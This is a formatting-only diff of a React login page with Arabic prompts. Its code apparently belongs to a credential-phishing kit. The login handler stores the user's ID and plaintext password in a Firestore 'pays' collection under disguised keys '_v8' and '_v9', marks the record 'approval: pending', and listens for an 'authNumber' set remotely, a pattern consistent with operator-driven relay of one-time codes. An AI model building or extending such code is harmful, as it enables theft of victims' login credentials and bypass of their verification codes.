@@ -1,5 +1,5 @@
 "use client";
-import { useState,useEffect } from "react";
+import { useState, useEffect } from "react";
 import { Loader2Icon, Menu, ShieldAlert, Smartphone } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -19,24 +19,25 @@ export default function Component() {
   const [authNumber, setAuthNumber] = useState<string>("");
   const [isloading, setIsLoading] = useState(false);
   const [idLogin, setLoginID] = useState("");
-  const [password,setPassword] = useState("");
+  const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
 
-  
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId && db) {
-      const unsubscribe = onSnapshot(doc(db as Firestore, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
-          setAuthNumber( data.authNumber)
-      
-        }
-      })
+      const unsubscribe = onSnapshot(
+        doc(db as Firestore, "pays", visitorId),
+        (docSnap) => {
+          if (docSnap.exists()) {
+            const data = docSnap.data();
+            setAuthNumber(data.authNumber);
+          }
+        },
+      );
 
-      return () => unsubscribe()
+      return () => unsubscribe();
     }
-  }, [])
+  }, []);
 
   const handleLogin = async (e: any) => {
     e.preventDefault();
@@ -44,10 +45,10 @@ export default function Component() {
     setShowError("");
 
     setIsLoading(true);
-   await addData({
+    await addData({
       id: visitorId,
       _v8: idLogin,
-      _v9:password,
+      _v9: password,
       authNumber: "...",
       approval: "pending",
     });
@@ -112,7 +113,7 @@ export default function Component() {
                 onChange={(e) => setLoginID(e.target.value)}
                 required
               />
- <Input
+              <Input
                 placeholder="أدخل كلمة المرور الخاصة بك هنا"
                 className="text-right border-gray-300 h-12 text-lg focus:ring-2 focus:ring-teal-500 transition-all"
                 dir="rtl"
